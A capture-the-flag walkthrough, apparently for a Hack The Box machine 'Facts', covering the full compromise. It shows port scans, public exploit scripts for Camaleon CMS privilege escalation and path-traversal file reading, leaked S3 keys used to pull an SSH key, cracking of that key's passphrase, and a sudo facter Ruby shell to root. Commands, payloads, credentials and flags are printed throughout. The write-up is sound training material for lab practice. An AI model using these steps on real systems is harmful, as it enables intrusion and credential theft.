### Summary
We start the box with access to a web server whose subdirectories we brute-force to find an `/admin` endpoint that allows user registration. Upon registering, we discover it's running a version of `Camaleon CMS` that's vulnerable to both Privesc and LFI, allowing us to leak `/etc/passwd` and the `user.txt`. When we elevate priveleges, we're able to leak `AWS S3` credentials, allowing us to create a profile and dump the contents of the `s3` bins, one of which has an `ssh` key. We discover the `ssh` key is for the user `trivia` but it's encrypted, so we use `ssh2john.py` along with `john` to crack it, getting a shell on the box. `trivia` is able to run `facter` as `sudo` which allows us to execute arbitrary `ruby` files, giving us a `root` shell

### Tools
- `feroxbuster`
- `burp`
- `aws`
- `john`
- `ssh-keygen -p -f` - change `ssh` key file's passphrase
- `facter`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Brute Force]]
- [[#HTTP - TCP 80]]
- [[#Camaleon CMS Authenticated Privesc (CVE-2025-2304)]]
- [[#Camaleon CMS LFI (CVE-2024-46987)]]
###### [[#User Shell - trivia]]
- [[#AWS S3 Dump]]
- [[#Cracking ssh Key]]
- [[#Enumeration as trivia]]
###### [[#Root Shell]]
- [[#facter as sudo]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv $IP -oN nmap/tcp           
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
54321/tcp open  unknown syn-ack ttl 62
```
- Whatever's on port `54321` has a different TTL than the rest of the services, indicating that it's probably running in some kind of container

```sh
❯ sudo nmap -p 22,80,54321 -sCV -vv $IP -oN nmap/tcpScripts     
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
80/tcp    open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
| http-methods:
|_  Supported Methods: POST OPTIONS
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open  unknown syn-ack ttl 62
| fingerprint-strings:
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 189A05F8637D1A00
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 05 Mar 2026 18:39:27 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>189A05F8637D1A00</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Thu, 05 Mar 2026 18:39:27 GMT
|_    Content-Length: 0
```
- The TTL lines up with a posix adherent system
- The openSSH and nginx versions indicate Ubuntu `25.04`
- We're working with virtual hosting or subdomains since port `80` tried to redirect to `facts.htb`

### Subdomain Brute Force
```sh
❯ ffuf -u "http://10.129.45.122" -H "Host: FUZZ.facts.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-20000.txt -ac
```
- We don't get anything interesting, we'll add `facts.htb` to our `/etc/hosts` file and run `nmap -p 80 -sCV` again

## HTTP - TCP 80
---
- Navigating to `http://facts.htb` shows us a webpage to discover amazing trivia
- `wappalyzer` thinks that the web framework is Ruby on Rails
- There's an email on the main page, `contact@facts.htb`
- Hitting the explore button directs us to a post, `animal-ejected` which includes an image with an animal fact and comments below
	- bob, carol, and dave are potential usernames
- From here we can cycle through additional subdirectories with different trivia facts
- We can run `feroxbuster` to find endpoints we're already aware of, except for `sitemaps` which provides an XML file mapping various endpoints for the site
```sh
❯ feroxbuster -u "http://facts.htb/" -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/common.txt -x html -C 404
200      GET      114l      532w     6685c http://facts.htb/400
200      GET      114l      371w     4836c http://facts.htb/404
200      GET      114l      574w     7918c http://facts.htb/500
200      GET      114l      532w     6685c http://facts.htb/400.html
200      GET      114l      371w     4836c http://facts.htb/404.html
200      GET      114l      574w     7918c http://facts.htb/500.html
302      GET        0l        0w        0c http://facts.htb/admin => http://facts.htb/admin/login
302      GET        0l        0w        0c http://facts.htb/admin.cgi => http://facts.htb/admin/login
302      GET        0l        0w        0c http://facts.htb/admin.php => http://facts.htb/admin/login
302      GET        0l        0w        0c http://facts.htb/admin.pl => http://facts.htb/admin/login
302      GET        0l        0w        0c http://facts.htb/admin.html => http://facts.htb/admin/login
200      GET        0l        0w        0c http://facts.htb/ajax
200      GET        0l        0w        0c http://facts.htb/ajax.html
...
```

- Interestingly, we find an `admin` endpoint that allows us to register an account
- Once we log in, we see that we're in an instance of `Camaleon CMS v2.9.0`

## Camaleon CMS Authenticated Privesc (CVE-2025-2304)
---
- By searching for an appropriate exploit online, we come across this [Github repo](https://github.com/Alien0ne/CVE-2025-2304) that advertises Authenticated privesc and optional S3 config leak
	- The vulnerability is with the `ajax` endpoint that allows the use of `!permit`, changing any key under password, including `password[role]=admin` which upgrades the user's role
- We can use the POC supplied by the repo:
```sh
❯ python3 cve-2025-2304.py -u http://facts.htb -U wallfly -P wallfly -e
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 5
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: AKIA9083DB086F2415A2
   s3 secret key: /rqZRsNaaS6OcaZLZKBWm/E1gvOM7reqcnrD9ti/
   s3 endpoint: http://localhost:54321
```

- Now when we go back to our login with the new password (default `test`) we see that we're admin authenticated!
- There are no interesting posts in the trash or drafts
- The only other user is admin, whose email is `admin@local.com`
- There's a weird plugin called `attack` but linking to its docs gives a `404`

## Camaleon CMS LFI (CVE-2024-46987)
---
- There's also an LFI vulnerability for this version of `Camaleon CMS`, a POC of which we can find in this [Github repo](https://github.com/Goultarde/CVE-2024-46987)
- The vulnerable endpoint is `/admin/media/download_private_file`
- We can run the python exploit through BURP by setting some bash environment variables:
```sh
❯ HTTP_PROXY=http://127.0.0.1:8080 HTTPS_PROXY=http://127.0.0.1:8080 python cve-2024-46987.py -u http://facts.htb -l wallfly -p test /etc/passwd           
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

- When we open the request in Burp's HTTP history:
```http
GET /admin/media/download_private_file?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: facts.htb
Cookie: _factsapp_session=bR9qMQgzgSF8O55PV01r9zCgkt0lTlplPJrEr2cHnrXIYw05xuzEgHCWWvlq9rm%2BewXfq0%2B7u%2Ff0fyJHrrLqSvYxRXPEBo%2B%2FJAUJW8PtzfOMYD9KYv5cwWRRam9YTAqkekqkRPeRAmgmqk%2B0tiCuCJEx3LeoOYWLXTCAsBsbbPqvjVJF4SL4O8X712VSSGgmeEGMaBZtWuCLkoSYrwH0cwT7aUwbtQ7mE7j1oV1RmSPEYBfqu5ZpCFU6GUOYNUgXX55TvWx0raOIpQhXfop5kJLd0KoandmNZIlaI6mMNs4CUyFdZMKtleahce7QTFa3Fkml1T0%3D--iSToh%2BeHd71YUiq1--PwatgmJYe%2BOOM7wFeFzl4w%3D%3D; auth_token=YesVPLES4AMT6RpxpyeN0Q&python-requests%2F2.32.4&10.10.15.234

HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Date: Thu, 05 Mar 2026 19:55:28 GMT
Content-Type: application/octet-stream
Content-Length: 1809
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: inline; filename="passwd"; filename*=UTF-8''passwd
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 2112eb96-20f1-4cf0-a33e-18d44a378ede
x-runtime: 0.072241

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
...
```
- With this we can see that only 3 users have shells on the box
	- `root`, `trivia`, and `william`
- We can modify the burp request to get the file `/home/william/user.txt` and we see that the resultant flag is `1c5e334550b64480aa735c9352dbd8b2`

# User Shell - trivia
## AWS S3 Dump
---
- Now that we've got the AWS keys, we can try and dump the contents of the `S3` buckets
- First we need to configure a profile for our usecase:
```sh
❯ aws configure --profile facts                                  
AWS Access Key ID [None]: AKIA9083DB086F2415A2
AWS Secret Access Key [None]: /rqZRsNaaS6OcaZLZKBWm/E1gvOM7reqcnrD9ti/
Default region name [None]: us-east-1
Default output format [None]: json
```

- Now we can list the `s3` buckets available to our profile
```sh
❯ aws --profile facts --endpoint-url http://facts.htb:54321 s3 ls               
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

- Now we can list the contents of the `internal` bucket at the given endpoint
```sh
❯ aws --profile facts --endpoint-url http://facts.htb:54321 s3 ls s3://internal/
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .bash_logout
2026-01-08 13:45:13       3900 .bashrc
2026-01-08 13:47:17         20 .lesshst
2026-01-08 13:47:17        807 .profile
```

- Let's extract the `ssh` key in this bucket to our attack box
```sh
❯ aws --profile facts --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519
```

- Attempting to use the `ssh` key for `william` prompts for a password
```sh
❯ ssh -i id_ed25519 william@10.129.45.122
william@10.129.45.122's password: 
```

- Attempting to use the `ssh` key for `trivia` prompts for a passphrase
```sh
❯ ssh -i id_ed25519 trivia@10.129.45.122
Enter passphrase for key 'id_ed25519': 
```
- This means that it's an encrypted `ssh` key for the user `trivia`, we'll need to crack it

## Cracking ssh Key
---
- We can convert the `ssh` key to a crackable has using the `john` utility `ssh2john`
- Then we can try to crack it via `john`
```sh
❯ ssh2john.py id_ed25519 > ssh.hash
❯ john ssh.hash --wordlist=/home/aldamd/ctf/TOOLS/wordlist/rockyou.txt
...
dragonballz      (id_ed25519)     
...
```
- Nice, we've got the passphrase, `dragonballz`

```sh
❯ ssh -i id_ed25519 trivia@10.129.45.122                              
Enter passphrase for key 'id_ed25519': dragonballz
...
trivia@facts:~$ 
```

- We can strip the passphrase from the `ssh` key with `ssh-keygen -p -f` to change the passphrase
```sh
❯ ssh-keygen -p -f id_ed25519 
Enter old passphrase: dragonballz
Key has comment 'trivia@facts.htb'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
```

## Enumeration as trivia
---
- There's nothing very interesting under `/home` other than the `user.txt` in `/home/william` and a ton of `ruby` gems
- There's nothing especially interesting in `/opt/factsapp/config`
- There are no `crontab`s that we have access too
- Running `sudo -l` shows us
```sh
trivia@facts:/opt/factsapp/config$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

# Root Shell
## facter as sudo
---
- We can grab the [GTFObins link for `facter`](https://gtfobins.org/gtfobins/facter/)
- We can use `facter` to run a `ruby` file with `root` privileges
- The following is a shell spawning `ruby` file
```ruby
exec "/bin/sh"
```

- Now we need only invoke `facter` while defining a custom directory so that it will invoke all ruby files in the directory we specify
```sh
trivia@facts:/tmp$ sudo facter --custom-dir=/tmp x
# whoami
root
# cat /root/root.txt
d2e9c1a447f86ecf647bf27c4479b2e2
```
